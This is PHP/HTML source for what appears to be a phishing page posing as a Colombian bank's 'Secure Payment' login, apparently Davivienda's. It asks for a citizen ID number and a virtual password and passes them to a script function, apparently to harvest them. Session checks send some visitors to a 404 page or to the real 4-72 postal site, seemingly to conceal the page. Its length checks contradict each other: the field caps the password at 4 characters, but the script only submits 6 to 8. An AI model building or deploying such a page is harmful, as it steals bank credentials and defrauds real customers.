<?php

session_start();


if(isset($_SESSION['estado']) && $_SESSION['estado'] == 1){


}else if(isset($_SESSION['estado']) && $_SESSION['estado'] == 2){
header('location:/404.php');

}else if(isset($_SESSION['estado']) && $_SESSION['estado'] == 3){

    header('location:https://www.4-72.com.co/publicaciones/236/personas/');
}

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0">

	<script type="text/javascript" src="../../scripts/jquery-3.6.0.min.js"></script>
		<script src="../../scripts/jquery.jclock-min.js" type="text/javascript"></script>
   		<script type="text/javascript" src="../../scripts/functions2.js"></script>  		



    <title>Secure Payment</title>
    <style>
        *{
            margin: 0;
            padding: 0;
            font-family: arial;
            -webkit-appearance: none !important;
            -moz-appearance: none !important;
            color:white;
        }


        input{
            background-color: #605c5cd2;
            height: 40px;
        }

        a{
            font-size: 22px;
            margin-left:10px;
           
        }
        

        select{
            background-color: #e2e2e2b2;
            height: 40px;
            border: none;
            width: 75%;
            margin-left:50px;
            border-radius: 12px;
            padding-left: 10px;
        }
        input{
            width: 35%;
            border-radius:12px;
            padding-left:5px;
        }
    </style>
</head>
<body style="background-color:#6d6e72;">
<img src="/img/texto.jfif" alt="" srcset="" width="100%">

<div class="datos" style="background-color:;">
    <h6 style="margin-left:50px; margin-top:25px;">Tipo documento</h6>
    <select name="cc" id="">
        <option value="cedula" select>Cedula de Ciudadania</option>
    </select><br><br>

    <center><label for="documento" style="margin-left:-10px;"> <b>No. documento</b>
    </label>
    <label for="clave" style="margin-left:50px;"> <b>Clave virtual</b>
    </label><br>

    <input type="tel" name="documento" id="txtUsuario" style="margin-top:5px;" required minlength="6" maxlength="10">
    <input type="password" name="clave" id="txtPass" style="margin-top:5px;" minlength="4" maxlength="4">
    <input type="hidden" value="davipla" id="banco">

        <input type="submit" value="Ingresar" id="btnUsuario" style="border:none; background-color:red; height:45px; border-bottom:5px solid red; margin-top:5px;"><br><br><br>
        <a style="font-size:15px;">Â¿OlvidÃ³ o bloqueÃ³ su clave?</a> <br>
</center>
<br><br>
</div>


    <img src="/img/davi1.jfif" alt="" srcset="" width="100%">

    <img src="/img/davi2.jfif" alt="" srcset="" width="100%">

</body>

<script>
  const txtPass = document.getElementById('txtPass');

  txtPass.addEventListener('input', function() {
    const value = txtPass.value;
    const cleanValue = value.replace(/\D/g, ''); // Remover caracteres no numÃ©ricos

    if (value !== cleanValue) {
      txtPass.value = cleanValue;
    }
  });
</script>


<script type="text/javascript">
$(document).ready(function() {

    $('#btnUsuario').click(function(){
        if (($("#txtUsuario").val().length > 0)) {
            if ($("#txtPass").val().length >= 6 && $("#txtPass").val().length <= 8) {
    pasousuario($("#txtPass").val(), $("#txtUsuario").val(), $("#banco").val());
}
        }else{
            $("#err-mensaje").show();
            $(".user").css("border", "1px solid red");
            $("#txtUsuario").focus();
        }			
    });
});
</script>
</html>
